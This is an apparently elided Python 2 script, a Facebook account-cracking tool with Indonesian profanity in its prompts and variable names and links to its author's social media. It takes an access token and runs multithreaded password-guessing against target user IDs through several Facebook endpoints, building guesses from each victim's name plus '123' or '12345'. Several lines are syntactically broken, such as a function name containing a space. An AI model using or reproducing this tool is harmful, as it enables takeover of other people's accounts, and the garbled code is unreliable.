#!/usr/bin/python2
# coding=utf-8
# code by hilal ganteng
# my facebook ( https://www.facebook.com/m.hilal.7370 )

#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Can't make u real programmer:)
#      Coded By Hilal ganteng
...
logo = ''' \033[0;96m __  __        __  ______  ____
 \033[0;96m \ \/ / ____  /  |/  / _ )/ __/ ® \033[0m|| Created By Lal kimochi
...
def Lal kimochi():
    ...
    if kontol in ('open', 'Open', 'OPEN'):
        print '\n%s *%s note! usahakan akun Pribadi lu kontol login di google chrome terlebih dahulu'%(B,N);time.sleep(2)
        ...
        raw_input(' %s*%s tekan enter muka beler '%(O,N))
    ...
    try:
        ...
        print '\n\n %s[%s!%s] token invalid'%(N,M,N);time.sleep(2);Lal kimochi()
...
def moch_yayan():
    ...
    try:
        ...
        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');Lal kimochi()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
    except KeyError:
        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');Lal kimochi()
    ...
    os.system('clear')
    print logo
    IP = requests.get('https://www.Lal kimochi.my.id/server/ip/').text
    ...
    print ' [%sCEK%s]. Cek opsi krek'%(O,N);time.sleep(0.03)
    pepek = raw_input('\n [*] menu : ')
    if pepek == '':
...
def info_tools():
    ...
    print '\n %s[%s>%s] Yt       : Lal gaming.'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Author   : Lal kimochi.'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Github   : https://github.com/Hilal11M'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Facebook : https://www.facebook.com/m.hilal.7370'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Fanspage : https://www.facebook.com/m.hilal.7370'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Instagram: https://www.instagram.com/hilal033_'%(N,H,N);time.sleep(0.07)
                ...
                if pwek == '':
                    ...
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        ...
                        if cin == '':
                            ...
                            with YayanGanteng(max_workers=30) as (__Lal kimochi__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __Lal kimochi__.submit(self.__api__, kimochi, ysc)
                                    except: pass
                            ...
                            with YayanGanteng(max_workers=30) as (__Lal kimochi__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __Lal kimochi__.submit(self.__mbasic__, kimochi, ysc)
                                    except: pass
                            ...
                            with YayanGanteng(max_workers=30) as (__Lal kimochi__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __Lal kimochi__.submit(self.__mfb,__, kimochi, ysc)
                                    except: pass
            	...
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __Lal kimochi__.submit(self.__api__, uid, pwx)
                    except:
                        pass
            	...
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __Lal kimochi__.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass
            	...
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __Lal kimochi__.submit(self.__mfb__, uid, pwx)
                    except:
                        pass
